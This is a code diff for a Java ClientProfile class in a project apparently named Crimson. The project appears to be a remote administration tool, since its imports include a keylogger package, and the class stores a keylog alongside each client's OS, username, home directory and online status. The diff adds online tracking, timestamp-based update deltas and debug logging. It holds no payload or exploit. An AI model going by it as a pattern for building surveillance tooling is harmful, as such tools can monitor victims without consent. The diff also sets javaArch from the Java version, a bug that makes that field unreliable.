@@ -26,7 +26,12 @@ import java.util.Locale;
 
 import javax.swing.ImageIcon;
 
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+
+import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.Reporter;
+import com.subterranean_security.crimson.core.Common.Instance;
 import com.subterranean_security.crimson.core.proto.Delta.EV_ProfileDelta;
 import com.subterranean_security.crimson.core.proto.Delta.NetworkInterface;
 import com.subterranean_security.crimson.core.util.CUtil;
@@ -34,6 +39,8 @@ import com.subterranean_security.crimson.sv.keylogger.Log;
 import com.subterranean_security.crimson.viewer.ui.UIUtil;
 
 public class ClientProfile implements Serializable {
+
+	private static final Logger log = LoggerFactory.getLogger(ClientProfile.class);
 
 	private static final long serialVersionUID = 1L;
 
@@ -45,6 +52,7 @@ public class ClientProfile implements Serializable {
 
 	// General attributes
 	private Log keylog;
+	private Attribute online;
 	private Attribute osFamily;
 	private Attribute osName;
 	private Attribute osArch;
@@ -97,6 +105,7 @@ public class ClientProfile implements Serializable {
 
 	public ClientProfile() {
 		keylog = new Log();
+		online = new TrackedAttribute();
 		osFamily = new UntrackedAttribute();
 		osName = new UntrackedAttribute();
 		osArch = new UntrackedAttribute();
@@ -144,6 +153,14 @@ public class ClientProfile implements Serializable {
 		return keylog;
 	}
 
+	public boolean getOnline() {
+		return Boolean.parseBoolean(online.get());
+	}
+
+	public void setOnline(boolean b) {
+		((TrackedAttribute) online).set("" + b);
+	}
+
 	public String getOsFamily() {
 		return osFamily.get();
 	}
@@ -158,22 +175,25 @@ public class ClientProfile implements Serializable {
 
 	public void setOsName(String osName) {
 		this.osName.set(osName);
-		String icon = osName.replaceAll(" ", "_").toLowerCase();
+		if (Common.instance == Instance.VIEWER) {
+			String icon = osName.replaceAll(" ", "_").toLowerCase();
 
-		if (icon.contains("ubuntu")) {
-			icon = "ubuntu";
+			if (icon.contains("ubuntu")) {
+				icon = "ubuntu";
+			}
+
+			try {
+				osNameIcon = UIUtil.getIcon("icons16/platform/" + icon + ".png");
+
+			} catch (NullPointerException e) {
+				Reporter.report(Reporter.newReport().setComment("No OS icon found: " + icon).build());
+
+				// fall back to os family
+				osNameIcon = UIUtil.getIcon("icons16/platform/" + osFamily.get() + ".png");
+			}
+			osNameIcon.setDescription(osName);
+
 		}
-
-		try {
-			osNameIcon = UIUtil.getIcon("icons16/platform/" + icon + ".png");
-
-		} catch (NullPointerException e) {
-			Reporter.report(Reporter.newReport().setComment("No OS icon found: " + icon).build());
-
-			// fall back to os family
-			osNameIcon = UIUtil.getIcon("icons16/platform/" + osFamily.get() + ".png");
-		}
-		osNameIcon.setDescription(osName);
 
 	}
 
@@ -481,9 +501,129 @@ public class ClientProfile implements Serializable {
 		return osNameIcon;
 	}
 
+	public Date getLastUpdate() {
+		Date d = new Date(0);
+
+		if (online.getTimestamp().after(d)) {
+			d = online.getTimestamp();
+		}
+
+		if (osFamily.getTimestamp().after(d)) {
+			d = osFamily.getTimestamp();
+		}
+
+		if (osName.getTimestamp().after(d)) {
+			d = osName.getTimestamp();
+		}
+
+		if (osArch.getTimestamp().after(d)) {
+			d = osArch.getTimestamp();
+		}
+
+		if (javaArch.getTimestamp().after(d)) {
+			d = javaArch.getTimestamp();
+		}
+
+		if (javaVersion.getTimestamp().after(d)) {
+			d = javaVersion.getTimestamp();
+		}
+
+		if (javaVendor.getTimestamp().after(d)) {
+			d = javaVendor.getTimestamp();
+		}
+
+		if (crimsonVersion.getTimestamp().after(d)) {
+			d = crimsonVersion.getTimestamp();
+		}
+
+		if (timezone.getTimestamp().after(d)) {
+			d = timezone.getTimestamp();
+		}
+
+		if (language.getTimestamp().after(d)) {
+			d = language.getTimestamp();
+		}
+
+		if (username.getTimestamp().after(d)) {
+			d = username.getTimestamp();
+		}
+
+		if (userStatus.getTimestamp().after(d)) {
+			d = userStatus.getTimestamp();
+		}
+
+		// TODO finish ...
+
+		log.debug("Found last update date: {}", d);
+		return d;
+	}
+
+	public EV_ProfileDelta getUpdates(Date last) {
+		Date start = new Date();
+		EV_ProfileDelta.Builder pd = EV_ProfileDelta.newBuilder().setCvid(getCvid());
+
+		if (online.getTimestamp().after(last)) {
+			pd.setOnline(Boolean.parseBoolean(online.get()));
+		}
+
+		if (osFamily.getTimestamp().after(last)) {
+			pd.setOsFamily(osFamily.get());
+		}
+
+		if (osName.getTimestamp().after(last)) {
+			pd.setOsName(osName.get());
+		}
+
+		if (javaArch.getTimestamp().after(last)) {
+			pd.setJavaArch(javaArch.get());
+		}
+
+		if (javaVersion.getTimestamp().after(last)) {
+			pd.setJavaArch(javaVersion.get());
+		}
+
+		if (javaVendor.getTimestamp().after(last)) {
+			pd.setJavaVendor(javaVendor.get());
+		}
+
+		if (crimsonVersion.getTimestamp().after(last)) {
+			pd.setCrimsonVersion(crimsonVersion.get());
+		}
+
+		if (timezone.getTimestamp().after(last)) {
+			pd.setTimezone(timezone.get());
+		}
+
+		if (language.getTimestamp().after(last)) {
+			pd.setLanguage(language.get());
+		}
+
+		if (username.getTimestamp().after(last)) {
+			pd.setUserName(username.get());
+		}
+
+		if (userStatus.getTimestamp().after(last)) {
+			pd.setUserStatus(userStatus.get());
+		}
+
+		if (userHome.getTimestamp().after(last)) {
+			pd.setUserHome(userHome.get());
+		}
+
+		// TODO finish ...
+
+		log.debug("Calulated profile update in {} ms", new Date().getTime() - start.getTime());
+		return pd.build();
+
+	}
+
 	public void amalgamate(EV_ProfileDelta c) {
+		Date start = new Date();
 		if (c.hasDepartureTime()) {
-			setMessageLatency("" + (new Date().getTime() - c.getDepartureTime()));
+			setMessageLatency("" + (new Date().getTime() - c.getDepartureTime()) + " ms");
+		}
+		if (c.hasOnline()) {
+			setOnline(c.getOnline());
 		}
 		if (c.hasOsFamily()) {
 			setOsFamily(c.getOsFamily());
@@ -577,6 +717,7 @@ public class ClientProfile implements Serializable {
 		}
 		// network interfaces
 
+		log.debug("Profile amalgamated in {} ms", new Date().getTime() - start.getTime());
 	}
 
 }
